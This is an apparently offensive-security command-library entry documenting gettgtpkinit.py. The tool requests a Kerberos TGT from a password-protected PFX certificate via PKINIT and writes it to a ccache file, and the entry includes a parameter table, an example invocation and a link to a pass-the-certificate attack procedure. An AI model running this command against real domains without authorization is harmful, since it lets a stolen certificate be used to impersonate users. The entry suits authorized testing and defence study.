---
id: 38f3d328-3493-42c4-b831-ee743361b075
name: get-tgt-pfx-certificate-password
type: command
executor: python
data: >-
  gettgtpkinit.py -cert-pfx $_PFX_PATH -pfx-pass $_PFX_PASSWORD
  $_DOMAIN/$_TARGET_USER -hashes :$_PASSWORD $_TGT_CCACHE
output: null
created_at: '2023-04-06T03:56:06.176828+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - tgt
  - pkinit
verified: true
validated: true
---

# get-tgt-pfx-certificate-password

## Command

```python
gettgtpkinit.py -cert-pfx $_PFX_PATH -pfx-pass $_PFX_PASSWORD $_DOMAIN/$_TARGET_USER -hashes :$_PASSWORD $_TGT_CCACHE
```

## Description

Requests TGT from a password-protected PFX certificate using PKINIT.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -cert-pfx | PFX file path | Yes |
| -pfx-pass | PFX password | Yes |
| $_DOMAIN/$_TARGET_USER | Target user principal | Yes |
| -hashes | Optional auth hash | No |
| $_TGT_CCACHE | Ccache output | Yes |

## Examples

### Basic Usage

```python
gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass Pass123 domain.local/user tgt.ccache
```

## Expected Output

TGT generated and saved to ccache file without errors.

## Related

- [[procedures/Pass-The-Certificate-Attack]]
